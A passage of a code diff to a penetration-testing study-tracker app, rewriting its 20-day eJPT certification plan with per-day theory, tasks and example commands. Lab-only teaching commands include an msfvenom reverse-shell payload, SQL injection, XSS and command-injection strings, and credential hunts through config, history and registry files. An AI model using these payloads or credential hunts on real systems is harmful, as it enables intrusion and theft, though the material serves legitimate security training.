@@ -442,8 +442,8 @@
    ========================================================= */
 const OSCP_PHASES = ["Foundations","Enumeration","Initial Access","Web Exploitation","Linux Privesc","Windows Privesc","Active Directory","Password Attacks","Client-Side Attacks","Exploit Dev Basics","Post-Exploitation","Full Attack Chains","OSCP Lab Practice","Mock Exams","Exam Prep"];
 const OSCP_PHASE_SHORT = ["FOUND","ENUM","INIT-AX","WEB","LNX-PE","WIN-PE","AD","PASS","CLIENT","EXP-DEV","POST-EX","CHAINS","LABS","MOCKS","EXAM"];
-const EJPT_PHASES = ["Assessment Methodology","Host & Network Auditing","Network Security","System Security","Vulnerability Assessment","Web App Security","Exam Prep"];
-const EJPT_PHASE_SHORT = ["METHOD","AUDIT","NET-SEC","SYS-SEC","VULN-AX","WEB-SEC","EXAM"];
+const EJPT_PHASES = ["Methodology","Recon & Scanning","Auditing","Web Attacks","Host & Network Pentest","Pivoting","Exam Prep"];
+const EJPT_PHASE_SHORT = ["METHOD","RECON","AUDIT","WEB","HOST-NET","PIVOT","EXAM"];
 
 /* PJPT rail — grouped from the official TCM PEH/PJPT areas plus the prerequisite
    and supporting-skill days that lead into them. Kept to the phases the first
@@ -496,7 +496,11 @@ const CONCEPTS_META = {
   "active-directory-basics":"Active Directory architecture",
   "ad-enumeration":"Active Directory enumeration",
   "ad-credential-attacks":"AD credential attacks",
-  "bloodhound":"BloodHound & AD attack paths"
+  "bloodhound":"BloodHound & AD attack paths",
+  "osint":"Passive information gathering (OSINT)",
+  "active-recon":"Active information gathering / footprinting",
+  "post-exploitation":"Post-exploitation & Meterpreter",
+  "pivoting":"Pivoting & tunneling"
 };
 
 function defaultState(){
@@ -532,8 +536,9 @@ function defaultState(){
 function defaultMocks(track){
   if(track==='ejpt'){
     return [
-      {id:1, phase:"Early Diagnostic", plannedWhen:"~ Day 8 (after Host & Network Auditing)", status:"Upcoming", date:"", duration:"", attempted:"", rooted:"", score:"", notes:"Baseline check on an easy unseen box."},
-      {id:2, phase:"eJPT Readiness Simulation", plannedWhen:"Day 17 (readiness assessment)", status:"Upcoming", date:"", duration:"", attempted:"", rooted:"", score:"", notes:"Timed, no external help. Methodology speed matters."}
+      {id:1, phase:"Early Diagnostic", plannedWhen:"~ Day 8 (after Host & Network Auditing)", status:"Upcoming", date:"", duration:"", attempted:"", rooted:"", score:"", notes:"Baseline check on an easy unseen lab host."},
+      {id:2, phase:"Pivoting Checkpoint", plannedWhen:"~ Day 19 (after Pivoting & Tunneling)", status:"Upcoming", date:"", duration:"", attempted:"", rooted:"", score:"", notes:"Most eJPT fails are missed pivots — confirm you can autoroute + proxychains into a hidden subnet unaided."},
+      {id:3, phase:"eJPT Exam Simulation", plannedWhen:"Day 20 — full readiness assessment", status:"Upcoming", date:"", duration:"", attempted:"", rooted:"", score:"", notes:"Timed, unseen multi-host network with a pivot. No external help. Methodology speed matters."}
     ];
   }
   if(track==='pjpt'){
@@ -746,124 +751,544 @@ function buildPhase1Days(){
 }
 
 /* =========================================================
-   eJPT DAY PLAN — shorter, exam-domain-aligned track.
-   Days that cover the same ground as an OSCP day carry the same
-   concept tag so progress is visible across both tracks.
+   eJPT DAY PLAN — eLearnSecurity/INE Junior Penetration Tester (eJPTv2).
+   Source of truth: INE's official eJPT certification page. The exam is a
+   fully practical, ~48h open-book black-box assessment of an internal
+   network with multiple hosts, graded on real compromises (you must pass
+   every domain and 70% overall). Official eJPTv2 exam domains, used as
+   `officialDomain` values (with their exam weight):
+     - Assessment Methodologies            (25%)
+     - Host & Network Auditing             (25%)
+     - Host & Network Penetration Testing  (35%)
+     - Web Application Penetration Testing  (15%)
+   This 20-day roadmap is weighted like the real exam: methodology and
+   recon first, then the Metasploit-driven host/network exploitation and
+   pivoting that the exam leans on most. Days that overlap OSCP/PJPT ground
+   carry the same concept tag so cross-track progress stays visible.
+
+   COMMAND SAFETY: every command that touches a target is for the user's own
+   isolated lab, INE/TryHackMe/HTB labs, or an explicitly authorised
+   environment only (labelled LAB ONLY). Nothing here targets systems the
+   user does not own or is not authorised to test.
    ========================================================= */
 function buildEjptDays(){
   const D = [];
-  const mk = (day,objective,topic,subtopics,theory,practical,lab,tools,tasks,est,priority,difficulty,phase,concepts)=>({
-    id:day, day, phase, track:"ejpt", objective, topic, subtopics, theory, practical, lab, tools,
-    tasks: tasks.map((t,i)=>({id:"ejpt-"+day+"-"+i, text:t, done:false})),
-    estHours:est, actHours:"", priority, difficulty, confidence:0,
-    status:"Not started", notes:"", completed:false, completedDate:"", timerStart:"",
-    concepts: concepts||[]
+  const mk = (c)=>({
+    id:c.day, day:c.day, phase:c.phase, track:"ejpt",
+    officialDomain:c.officialDomain,
+    objective:c.title, topic:c.topic, subtopics:c.subtopics,
+    theory:c.theory, practical:c.practical, lab:c.lab, tools:c.tools,
+    commands:c.commands||[], exitCriteria:c.exit||"", prompt:c.prompt||"",
+    tasks:(c.tasks||[]).map((t,i)=>({id:"ejpt-"+c.day+"-"+i, text:t, done:false})),
+    estHours:c.est, actHours:"", priority:c.priority||"High", difficulty:c.difficulty||"Medium",
+    confidence:0, status:"Not started", notes:"", completed:false, completedDate:"", timerStart:"",
+    concepts:c.concepts||[]
   });
 
-  D.push(mk(1,"Understand how data actually moves across a network","TCP/IP & networking basics","OSI vs TCP/IP model, IP addressing, subnetting",
-    "Read/watch a TCP/IP model + subnetting primer.",
-    "Draw the TCP/IP model from memory and manually solve 3 subnetting problems.",
-    "None — theory + self-test","Pen & paper",
-    ["Draw the 4-layer model from memory","Solve 3 subnetting problems by hand","Write a 5-line summary in your own words"],1.5,"High","Easy","Assessment Methodology",["tcpip-fundamentals","subnetting"]));
+  D.push(mk({day:1, phase:"Methodology", officialDomain:"Assessment Methodologies",
+    title:"eJPT Roadmap + Lab & Tooling Setup",
+    topic:"What the eJPT exam actually tests and getting your kit ready",
+    subtopics:"Exam format (practical, ~48h, open-book, multi-host, pass every domain), the 4 domains, Kali/tooling, note-taking",
+    theory:"LEARN: how the eJPT exam works — a practical black-box network you must actually compromise, graded across all 4 domains. UNDERSTAND why methodology and note-taking matter more than memorising tools.",
+    practical:"RUN: verify Kali and core tools. DOCUMENT: set up a notes structure and a findings log you'll reuse the whole track.",
+    lab:"Your own Kali VM + an isolated lab network (INE/TryHackMe/HTB or local vulnerable VMs).",
+    tools:"Kali Linux, Nmap, Metasploit, Burp Suite, a note tool (Obsidian/CherryTree)",
+    commands:[
+      {c:"ip addr ; ip route", note:"Confirm your lab interface + gateway"},
+      {c:"nmap --version ; msfconsole -v", note:"Verify Nmap & Metasploit are present"},
+      {c:"searchsploit -u", note:"Update the local exploit database"},
+      {c:"mkdir -p ~/ejpt/{scans,loot,notes,exploits}", note:"Set up a notes/loot structure"}
+    ],
+    tasks:[
+      "Read the eJPT exam format: practical, ~48h, open-book, multi-host, must pass every domain",
+      "List the 4 exam domains and their weights from memory",
+      "Verify Kali updates and that Nmap + Metasploit launch",
+      "Update searchsploit / exploitdb",
+      "Create a notes + loot directory structure and a findings-log template"
+    ],
+    est:1.5, priority:"High", difficulty:"Easy",
+    exit:"You can describe how the eJPT exam is graded and have a working Kali + notes setup.",
+    concepts:["enumeration-methodology"]}));
 
-  D.push(mk(2,"Learn the assessment methodology eJPT expects","Assessment methodology","Pre-engagement, information gathering, scanning, exploitation, reporting phases",
-    "Read the standard pentest methodology (recon → scan → exploit → post-ex → report).",
-    "Write your own one-page version of the methodology in your own words.",
-    "None","Notes app",
-    ["List the 5 methodology phases","Explain what happens in each phase","Write why skipping recon causes problems later"],1.5,"High","Easy","Assessment Methodology",["enumeration-methodology"]));
+  D.push(mk({day:2, phase:"Methodology", officialDomain:"Assessment Methodologies",
+    title:"Networking & Protocols for eJPT",
+    topic:"The networking you must be fluent in to read scans and pivot later",
+    subtopics:"IPv4, subnetting/CIDR, TCP vs UDP, ports, the 3-way handshake, common services & ports, how routing enables pivoting",
+    theory:"LEARN: IP/subnetting, TCP vs UDP, the handshake, and common service ports. UNDERSTAND how subnets and routing set up the pivoting you'll need on the exam.",
+    practical:"RUN: inspect your lab networking and map subnets. DOCUMENT: a one-page port/protocol cheat sheet in your own words.",
+    lab:"Your isolated lab network.",
+    tools:"ip, ss, ping, dig/nslookup",
+    commands:[
+      {c:"ip addr ; ip route", note:"Your subnet(s) and gateway"},
+      {c:"ss -tulpn", note:"Listening services on your host"},
+      {c:"for p in 21 22 25 53 80 139 445 3389; do echo $p; done", note:"Review the ports you must recognise on sight"}
+    ],
+    tasks:[
+      "Solve 3 subnetting problems by hand (network, broadcast, host range)",
+      "Explain TCP vs UDP and the 3-way handshake in your own words",
+      "Build a cheat sheet of common ports/services (FTP/SSH/SMTP/DNS/HTTP/SMB/RDP/MySQL)",
+      "Explain in one paragraph how routing between subnets makes pivoting possible"
+    ],
+    est:2, priority:"High", difficulty:"Easy",
+    exit:"You can subnet by hand and recognise common services by port without notes.",
+    concepts:["tcpip-fundamentals","subnetting","core-protocols"]}));
 
-  D.push(mk(3,"Master Nmap for host & network auditing","Nmap host/network auditing","Host discovery, TCP/UDP scans, service/version detection, NSE",
-    "Read Nmap docs for -sn, -sS, -sV, -sU, -p-, --script.",
-    "Run a host-discovery sweep on a lab subnet, then a full -sC -sV scan on one host. Explain every flag used.",
-    "TryHackMe/INE lab subnet","nmap",
-    ["Host discovery sweep (-sn) across subnet","-sC -sV scan on one host","Run one NSE vuln script","Explain each flag used in your own words"],2,"High","Medium","Host & Network Auditing",["nmap-fundamentals","nmap-nse"]));
+  D.push(mk({day:3, phase:"Methodology", officialDomain:"Assessment Methodologies",
+    title:"Assessment Methodology & Reporting Notes",
+    topic:"The repeatable process you'll run on every exam host",
+    subtopics:"Pre-engagement, information gathering, scanning, enumeration, exploitation, post-exploitation, reporting; evidence capture",
+    theory:"LEARN: the standard penetration-testing phases and why enumeration is where the exam is won or lost. UNDERSTAND what evidence to capture as you go.",
+    practical:"RUN: write your own methodology checklist you'll follow per host. DOCUMENT: a finding template (title, description, evidence, impact, remediation).",
+    lab:"None — methodology + notes.",
+    tools:"Notes app",
+    commands:[
+      {c:"# per-host: recon -> scan -> enumerate -> exploit -> loot -> pivot", note:"The loop to repeat on every target"}
+    ],
+    tasks:[
+      "Write your own per-host methodology checklist",
+      "Explain why skipping enumeration causes exam failures",
+      "Create a reusable finding template (title/description/evidence/impact/remediation)",
+      "Decide how you'll capture evidence (screenshots + command output) as you work"
+    ],
+    est:1.5, priority:"High", difficulty:"Easy",
+    exit:"You have a written, repeatable methodology and a finding template ready for the exam.",
+    concepts:["enumeration-methodology","report-writing"]}));
 
-  D.push(mk(4,"Get comfortable with core service protocols","Core protocols","SMB, FTP, SSH, HTTP, DNS, Telnet basics",
-    "Read a short reference on SMB/FTP/SSH/HTTP/DNS/Telnet — purpose and default port.",
-    "Build a one-page protocol cheat sheet in your own words.",
-    "None","Notes app",
-    ["Learn purpose + port for SMB/FTP/SSH/HTTP/DNS/Telnet","Build your own cheat sheet"],1.5,"High","Easy","Host & Network Auditing",["core-protocols"]));
+  D.push(mk({day:4, phase:"Recon & Scanning", officialDomain:"Assessment Methodologies",
+    title:"Passive Information Gathering (OSINT)",
+    topic:"Learning about a target without touching it",
+    subtopics:"WHOIS, DNS records, subdomains, Google dorking, technology fingerprinting, email/username harvesting",
+    theory:"LEARN: what passive recon yields and where it fits before you send a single packet at a host. UNDERSTAND the line between passive and active.",
+    practical:"RUN: gather passive info on an authorised target/your own domain. DOCUMENT: a recon profile.",
+    lab:"An authorised lab target / your own domain / sanctioned OSINT practice only.",
+    tools:"whois, dig, host, theHarvester, WhatWeb, Google dorks",
+    commands:[
+      {c:"whois <authorised-domain>", note:"Registration & ownership (authorised only)"},
+      {c:"dig <domain> any ; host -t mx <domain>", note:"DNS/MX records"},
+      {c:"theHarvester -d <domain> -b bing", note:"Emails/subdomains (authorised only)"},
+      {c:"whatweb https://<domain>", note:"Passive-ish tech fingerprint"}
+    ],
+    tasks:[
+      "Explain passive vs active recon with one example each",
+      "Collect DNS records and subdomains for an authorised target",
+      "Harvest email/username patterns from authorised sources only",
+      "Fingerprint the technology stack",
+      "Write a concise recon profile"
+    ],
+    est:2, priority:"Medium", difficulty:"Easy",
+    exit:"You can produce an OSINT recon profile from authorised sources only.",
+    concepts:["osint","enumeration-methodology"]}));
 
-  D.push(mk(5,"Enumerate SMB and FTP like the exam expects","SMB & FTP enumeration","smbclient, enum4linux, anonymous FTP",
-    "Skim smbclient/enum4linux/anonymous-FTP basics.",
-    "Enumerate a lab host's SMB shares and attempt anonymous FTP login; note everything you find.",
-    "TryHackMe/INE lab host","smbclient, enum4linux, ftp",
-    ["List SMB shares with smbclient -L","Run enum4linux -a against target","Attempt anonymous FTP login","Note every piece of info leaked"],2,"High","Medium","Host & Network Auditing",["smb-enumeration","protocols-hands-on"]));
+  D.push(mk({day:5, phase:"Recon & Scanning", officialDomain:"Assessment Methodologies",
+    title:"Active Information Gathering & Footprinting",
+    topic:"First direct contact with lab targets",
+    subtopics:"Ping sweeps, DNS zone transfers, banner grabbing, identifying live hosts and the network layout",
+    theory:"LEARN: active footprinting techniques and what each reveals. UNDERSTAND how to build a host inventory before deep scanning.",
+    practical:"RUN: discover hosts and grab banners in your lab. DOCUMENT: a live-host inventory.",
+    lab:"Your isolated lab subnet ONLY.",
+    tools:"nmap, netdiscover, nc, dig",
+    commands:[
+      {c:"nmap -sn <lab-subnet>/24", note:"LAB ONLY — ping sweep for live hosts"},
+      {c:"netdiscover -r <lab-subnet>/24", note:"LAB ONLY — ARP-based host discovery"},
+      {c:"nc -nv <lab-target> 22", note:"LAB ONLY — banner grab a service"},
+      {c:"dig axfr @<lab-dns> <domain>", note:"LAB ONLY — attempt DNS zone transfer"}
+    ],
+    tasks:[
+      "Run a ping sweep and ARP discovery across the lab subnet",
+      "Banner-grab at least 3 services with nc",
+      "Attempt a DNS zone transfer in the lab",
+      "Produce a live-host inventory (IP, MAC, first-seen services)"
+    ],
+    est:2, priority:"High", difficulty:"Medium",
+    exit:"You can enumerate live hosts and grab banners, producing a host inventory for the lab.",
+    concepts:["active-recon","host-discovery"]}));
 
-  D.push(mk(6,"Learn Linux fundamentals for auditing a host from the inside","Linux host auditing","Filesystem navigation, users, permissions, processes",
-    "Skim Linux basics: ls/cd/chmod/whoami/ps.",
-    "In a Linux VM: navigate the filesystem, check permissions, list users and running processes.",
-    "Local Linux VM","bash",
-    ["ls -la, cd, chmod practice","whoami, id, ps aux","cat /etc/passwd — list users","Write down why each matters for auditing"],2,"High","Easy","Host & Network Auditing",["linux-cli-basics","linux-users-processes"]));
+  D.push(mk({day:6, phase:"Recon & Scanning", officialDomain:"Assessment Methodologies",
+    title:"Nmap — Host Discovery & Port/Service Scanning",
+    topic:"The scanning workflow you'll run constantly on the exam",
+    subtopics:"Discovery, TCP SYN/connect, UDP, version & OS detection, default scripts, output files, timing",
+    theory:"LEARN: -sn/-sS/-sT/-sU/-sV/-O/-sC and why full port coverage matters. UNDERSTAND how to turn ports into an attack surface.",
+    practical:"RUN: fully scan a lab host and save output. DOCUMENT: a service inventory.",
+    lab:"A single lab target ONLY.",
+    tools:"nmap",
+    commands:[
+      {c:"nmap -sS -p- -T4 -oN scans/all.txt <lab-target>", note:"LAB ONLY — full TCP SYN sweep, saved"},
+      {c:"nmap -sU --top-ports 50 <lab-target>", note:"LAB ONLY — top UDP ports"},
+      {c:"nmap -sV -sC -O -oN scans/deep.txt <lab-target>", note:"LAB ONLY — versions, scripts, OS"},
+      {c:"nmap -p<open-ports> -A <lab-target>", note:"LAB ONLY — aggressive detail on found ports"}
+    ],
+    tasks:[
+      "Run a full TCP port scan (-p-) and save the output",
+      "Scan top UDP ports",
+      "Add -sV -sC -O for versions, default scripts and OS guess",
+      "Build a service inventory: IP -> port -> protocol -> service -> version -> attack surface"
+    ],
+    est:2.5, priority:"High", difficulty:"Medium",
+    exit:"You can produce a complete, saved service inventory for a host from Nmap output.",
+    concepts:["nmap-fundamentals","port-service-enum","nmap-nse"]}));
 
-  D.push(mk(7,"Learn Windows fundamentals for auditing a host from the inside","Windows host auditing","CLI basics, whoami, systeminfo, net commands",
-    "Skim Windows CLI basics: whoami, systeminfo, net user, tasklist.",
-    "In a Windows VM: check current user/privileges, OS/patch info, local users, and running processes.",
-    "Local Windows VM","cmd, PowerShell",
-    ["whoami /priv","systeminfo","net user / net localgroup administrators","tasklist — identify running processes"],2,"High","Easy","Host & Network Auditing",["windows-fundamentals"]));
+  D.push(mk({day:7, phase:"Recon & Scanning", officialDomain:"Assessment Methodologies",
+    title:"Service Enumeration",
+    topic:"Digging into each exposed service for a way in",
+    subtopics:"FTP, SSH, SMB, HTTP, SMTP, MySQL/MSSQL, DNS — anonymous access, shares, users, misconfigurations",
+    theory:"LEARN: what to check on each common service. UNDERSTAND that enumeration depth is what separates a pass from a fail.",
+    practical:"RUN: enumerate multiple services on lab hosts. DOCUMENT: at least one next action per service.",
+    lab:"Lab hosts exposing several services ONLY.",
+    tools:"smbclient, enum4linux-ng, rpcclient, ftp, snmpwalk, curl, nmap NSE",
+    commands:[
+      {c:"smbclient -L //<lab-target>/ -N", note:"LAB ONLY — anonymous SMB shares"},
+      {c:"enum4linux-ng -A <lab-target>", note:"LAB ONLY — full SMB/NetBIOS enumeration"},
+      {c:"ftp <lab-target>   # try anonymous", note:"LAB ONLY — anonymous FTP"},
+      {c:"snmpwalk -v2c -c public <lab-target>", note:"LAB ONLY — SNMP community-string check"},
+      {c:"nmap --script <proto>-enum <lab-target>", note:"LAB ONLY — NSE service enumeration scripts"}
+    ],
+    tasks:[
+      "Enumerate SMB shares and users (smbclient/enum4linux-ng)",
+      "Attempt anonymous FTP and note exposed files",
+      "Check SNMP with the default community string",
+      "Enumerate a web/DB service with the relevant NSE scripts",
+      "For every service, write at least one concrete next action"
+    ],
+    est:2.5, priority:"High", difficulty:"Medium",
+    exit:"For every exposed lab service you can name a concrete next step toward access.",
+    concepts:["service-enumeration","smb-enumeration","protocols-hands-on"]}));
 
-  D.push(mk(8,"Understand network security concepts eJPT tests","Network security fundamentals","Firewalls, VPNs, sniffing, ARP, traffic analysis basics",
-    "Read a short primer on firewalls/VPNs/ARP and passive sniffing.",
-    "Capture traffic with Wireshark on a lab VM for 5 minutes and identify 3 protocols you see.",
-    "Local lab VM","Wireshark",
-    ["Capture 5 min of traffic","Identify 3 different protocols in the capture","Explain what ARP is used for in one paragraph"],2,"Medium","Medium","Network Security",[]));
+  D.push(mk({day:8, phase:"Recon & Scanning", officialDomain:"Assessment Methodologies",
+    title:"Vulnerability Assessment",
+    topic:"Turning enumeration into candidate exploits",
+    subtopics:"Mapping versions to CVEs, searchsploit, Nmap NSE vuln scripts, CVSS basics, vulnerability vs exploitability, false positives",
+    theory:"LEARN: how to map a service+version to known vulnerabilities and judge whether they're actually exploitable. UNDERSTAND CVSS at a glance.",
+    practical:"RUN: build an attack-surface table for a lab host. DOCUMENT: evidence and next step per finding.",
+    lab:"Your enumerated lab targets ONLY.",
+    tools:"searchsploit, nmap --script vuln, Nessus/OpenVAS (optional)",
+    commands:[
+      {c:"searchsploit <service> <version>", note:"Find public exploits for a version"},
+      {c:"searchsploit -m <edb-id>", note:"Copy an exploit locally to read it first"},
+      {c:"nmap --script vuln -oN scans/vuln.txt <lab-target>", note:"LAB ONLY — NSE vuln scripts"}
+    ],
+    tasks:[
+      "Map each enumerated service+version to candidate CVEs",
+      "Use searchsploit to find and read (not blindly run) public exploits",
+      "Run Nmap NSE vuln scripts against a lab host",
+      "Judge vulnerability vs exploitability and flag false positives",
+      "Create an attack-surface table: service / version / vuln / evidence / next step"
+    ],
+    est:2.5, priority:"High", difficulty:"Medium",
+    exit:"You can produce an evidence-backed attack-surface table and prioritise what to exploit.",
+    concepts:["vulnerability-assessment"]}));
 
-  D.push(mk(9,"Practice Netcat for banner grabbing and simple shells","Netcat basics","Listeners, banner grabbing, simple reverse/bind shells",
-    "Skim Netcat basic usage.",
-    "Set up a listener, banner-grab 2 services on a lab target, and catch a simple shell.",
-    "Local VM + lab target","netcat",
-    ["Set up nc -lvnp listener","Banner-grab 2 services","Catch a basic reverse shell in a lab VM"],1.5,"Medium","Medium","Network Security",["netcat-basics"]));
+  D.push(mk({day:9, phase:"Auditing", officialDomain:"Host & Network Auditing",
+    title:"Host & Network Auditing Fundamentals",
+    topic:"Auditing a host and network from the inside",
+    subtopics:"Windows & Linux system auditing, network information from a host, config/hardening basics, what to enumerate once you have access",
+    theory:"LEARN: what host & network auditing means in eJPT — enumerating a system you can access for users, config, network info and weaknesses. UNDERSTAND how auditing feeds privilege escalation.",
+    practical:"RUN: audit a Windows and a Linux lab VM from a normal user. DOCUMENT: users, services, network info, and anything weak.",
+    lab:"A Windows and a Linux lab VM you already have access to.",
+    tools:"whoami, net, ipconfig/ifconfig, ss/netstat, systemctl, sc, PowerShell",
+    commands:[
+      {c:"whoami /all ; net user ; net localgroup administrators", note:"LAB ONLY — Windows users/groups"},
+      {c:"ipconfig /all ; route print ; arp -a", note:"LAB ONLY — Windows network info"},
+      {c:"id ; cat /etc/passwd ; sudo -l", note:"LAB ONLY — Linux users & sudo rights"},
+      {c:"ss -tulpn ; ip route ; cat /etc/hosts", note:"LAB ONLY — Linux network info"}
+    ],
+    tasks:[
+      "Audit a Windows VM: users, admins, services, network config",
+      "Audit a Linux VM: users, sudo rights, services, network config",
+      "Collect network information (routes, ARP, hosts) from each",
+      "Note every misconfiguration or credential you find",
+      "Explain how each finding could feed privilege escalation or pivoting"
+    ],
+    est:2.5, priority:"High", difficulty:"Medium",
+    exit:"You can audit a Windows and a Linux host for users, config and network info, and link findings to next steps.",
+    concepts:["windows-fundamentals","linux-users-processes"]}));
 
-  D.push(mk(10,"Learn vulnerability assessment methodology","Vulnerability assessment","Vulnerability scanning concepts, CVSS basics, false positives",
-    "Read a short primer on vulnerability scanning and CVSS scoring.",
-    "Run a vulnerability scan (Nmap NSE vuln scripts or Nessus/OpenVAS if available) against a lab target and triage 3 findings.",
-    "TryHackMe/INE lab target","nmap --script vuln, Nessus/OpenVAS (optional)",
-    ["Run a vulnerability scan against a target","Pick 3 findings and explain severity in your own words","Flag anything you suspect is a false positive"],2,"High","Medium","Vulnerability Assessment",["vulnerability-assessment"]));
+  D.push(mk({day:10, phase:"Auditing", officialDomain:"Host & Network Auditing",
+    title:"Credential Gathering & Network Information from Hosts",
+    topic:"Finding hashes, passwords and network intel on a compromised host",
+    subtopics:"Password/hash locations, config files, history files, memory/SAM concepts, mapping the internal network from a foothold",
+    theory:"LEARN: where credentials hide on Windows/Linux and how network info from one host reveals the rest of the network. UNDERSTAND why this domain is 25% of the exam.",
+    practical:"RUN: hunt credentials and network info on lab hosts. DOCUMENT: a loot list and an internal network map.",
+    lab:"Lab hosts you have access to ONLY.",
+    tools:"grep, findstr, mimikatz (lab), reg, cat, netexec",
+    commands:[
+      {c:"grep -RiE 'pass|pwd|secret' /etc /var/www 2>/dev/null", note:"LAB ONLY — Linux credential hunt"},
+      {c:"cat ~/.bash_history ; cat ~/.*_history 2>/dev/null", note:"LAB ONLY — history files"},
+      {c:"findstr /si password *.txt *.ini *.config", note:"LAB ONLY — Windows credential hunt"},
+      {c:"reg query HKLM /f password /t REG_SZ /s", note:"LAB ONLY — registry stored creds"}
+    ],
+    tasks:[
+      "Search Linux config/history files for credentials",
+      "Search Windows files/registry for stored passwords",
+      "Extract or locate password hashes in the lab",
+      "Map the internal network reachable from the foothold",
+      "Build a loot list (creds/hashes) and an internal network map"
+    ],
+    est:2.5, priority:"High", difficulty:"Medium",
+    exit:"You can gather credentials/hashes and network information from a compromised host and map the internal network.",
+    concepts:["password-attacks","post-exploitation"]}));
 
-  D.push(mk(11,"Get hands-on with Metasploit basics","Metasploit framework","msfconsole, search, use, set options, exploit/auxiliary modules",
-    "Skim Metasploit basic usage: search, use, show options, set, exploit.",
-    "Use Metasploit to run one auxiliary scanner module and one exploit module against a lab target.",
-    "TryHackMe/INE lab target","msfconsole",
-    ["Search for a module with search","Configure options with set","Run an auxiliary scanner module","Run one exploit module against a vulnerable lab target"],2.5,"High","Medium","Vulnerability Assessment",["metasploit-basics"]));
+  D.push(mk({day:11, phase:"Web Attacks", officialDomain:"Web Application Penetration Testing",
+    title:"Web App Enumeration & Content Discovery",
+    topic:"Mapping a web application's attack surface",
+    subtopics:"HTTP methods/status codes, headers, cookies, tech fingerprinting, directory/file brute forcing, parameters, vhosts",
+    theory:"LEARN: HTTP fundamentals and how content discovery finds hidden surface. UNDERSTAND the map you build here drives every web attack.",
+    practical:"RUN: enumerate a deliberately vulnerable web app. DOCUMENT: a web attack-surface map.",
+    lab:"DVWA / OWASP Juice Shop / a lab web target ONLY.",
+    tools:"Burp Suite, ffuf, gobuster, WhatWeb, curl, Nikto",
+    commands:[
+      {c:"whatweb http://<lab-target> ; curl -I http://<lab-target>", note:"LAB ONLY — tech + headers"},
+      {c:"gobuster dir -u http://<lab-target> -w /usr/share/wordlists/dirb/common.txt", note:"LAB ONLY — directory discovery"},
+      {c:"ffuf -u http://<lab-target>/FUZZ -w /usr/share/wordlists/dirb/common.txt", note:"LAB ONLY — file/dir fuzzing"},
+      {c:"nikto -h http://<lab-target>", note:"LAB ONLY — quick web server issues"}
+    ],
+    tasks:[
+      "Fingerprint the web tech and inspect headers/cookies",
+      "Brute-force directories and files with gobuster/ffuf",
+      "Identify parameters and any login/upload points",
+      "Run Nikto for quick wins",
+      "Produce a web attack-surface map"
+    ],
+    est:2.5, priority:"High", difficulty:"Medium",
+    exit:"You can produce a clear web attack-surface map for a target application.",
+    concepts:["web-enum-tools","burp-suite"]}));
 
-  D.push(mk(12,"Practice authentication and password attacks","Authentication attacks","Brute force, credential stuffing, default creds, hash cracking basics",
-    "Skim Hydra basic usage and hash-cracking basics (hashcat/John).",
-    "Brute-force a lab login with Hydra using a small wordlist, then crack one sample hash with hashcat/John.",
-    "TryHackMe/INE lab target","hydra, hashcat/John",
-    ["Brute-force an SSH or HTTP login with Hydra","Crack one sample hash with hashcat or John","Write down why default/weak creds are a common finding"],2,"High","Medium","System Security",["password-attacks","authentication-attacks"]));
+  D.push(mk({day:12, phase:"Web Attacks", officialDomain:"Web Application Penetration Testing",
+    title:"Web Attacks — SQLi, XSS, Command Injection, Upload",
+    topic:"Exploiting the common web vulnerabilities the exam expects",
+    subtopics:"SQL injection (auth bypass + data extraction), reflected/stored XSS, command injection, insecure file upload, IDOR",
+    theory:"LEARN: how SQLi, XSS, command injection and unsafe upload work. UNDERSTAND the request -> vuln -> exploit -> impact -> remediation chain.",
+    practical:"RUN: exploit several web bugs in intentionally vulnerable apps only. DOCUMENT: each as a mini finding.",
+    lab:"DVWA and/or OWASP Juice Shop ONLY (intentionally vulnerable).",
+    tools:"Burp Suite, sqlmap, browser",
+    commands:[
+      {c:"' OR '1'='1 -- -", note:"LAB ONLY — SQLi auth-bypass test in DVWA"},
+      {c:"sqlmap -u 'http://<lab-target>/?id=1' --batch --dbs", note:"LAB ONLY — automated SQLi (lab apps only)"},
+      {c:"<script>alert(document.domain)<\/script>", note:"LAB ONLY — XSS probe"},
+      {c:"127.0.0.1; id", note:"LAB ONLY — command-injection test payload"}
+    ],
+    tasks:[
+      "Exploit a SQL injection (auth bypass + extract data) in a lab app",
+      "Trigger reflected and stored XSS",
+      "Exploit a command-injection point and get output",
+      "Abuse an insecure file upload to run code (lab only)",
+      "Write one finding as request -> vuln -> exploit -> impact -> remediation"
+    ],
+    est:3, priority:"High", difficulty:"Medium",
+    exit:"You can find and exploit the core web vulnerabilities and document them as findings.",
+    concepts:["web-app-attacks","authentication-attacks"]}));
 
-  D.push(mk(13,"Learn web application basics for the Web App Security domain","Web app attacks intro","HTTP methods, status codes, SQLi & XSS basics, directory fuzzing",
-    "Skim HTTP fundamentals and SQLi/XSS basics.",
-    "Run ffuf/gobuster against a lab web target, then attempt a basic SQLi and XSS in a deliberately vulnerable app (e.g. DVWA/Juice Shop).",
-    "DVWA / OWASP Juice Shop / lab web target","ffuf, gobuster, Burp Suite (optional)",
-    ["Directory-fuzz the target with ffuf/gobuster","Attempt a basic SQL injection in a vulnerable app","Attempt a basic reflected XSS in a vulnerable app","Explain HTTP status codes 200/301/403/404"],2.5,"High","Medium","Web App Security",["web-enum-tools","web-app-attacks"]));
+  D.push(mk({day:13, phase:"Host & Network Pentest", officialDomain:"Host & Network Penetration Testing",
+    title:"The Metasploit Framework",
+    topic:"The tool the eJPT exam leans on most",
+    subtopics:"msfconsole, workspaces, search/use/options, auxiliary vs exploit modules, payloads, sessions, msfvenom basics",
+    theory:"LEARN: the Metasploit workflow end-to-end and how modules, payloads and sessions fit together. UNDERSTAND when MSF is the fast path.",
+    practical:"RUN: use auxiliary and exploit modules against a lab target. DOCUMENT: the module + options that worked.",
+    lab:"A vulnerable lab target (e.g. Metasploitable) ONLY.",
+    tools:"msfconsole, msfvenom",
+    commands:[
+      {c:"msfconsole -q ; workspace -a ejpt", note:"Start MSF, create a workspace"},
+      {c:"db_nmap -sV <lab-target>", note:"LAB ONLY — scan into the MSF database"},
+      {c:"search <service> ; use <module> ; show options", note:"Find & configure a module"},
+      {c:"set RHOSTS <lab-target> ; set LHOST <kali-ip> ; run", note:"LAB ONLY — launch a module"},
+      {c:"msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali-ip> LPORT=4444 -f exe -o s.exe", note:"LAB ONLY — generate a payload"}
+    ],
+    tasks:[
+      "Start msfconsole and set up a workspace + db",
+      "Run an auxiliary scanner module against a lab target",
+      "Configure and run an exploit module to get a session",
+      "Generate a payload with msfvenom and explain each flag",
+      "Record the exact module + options that worked"
+    ],
+    est:3, priority:"High", difficulty:"Medium",
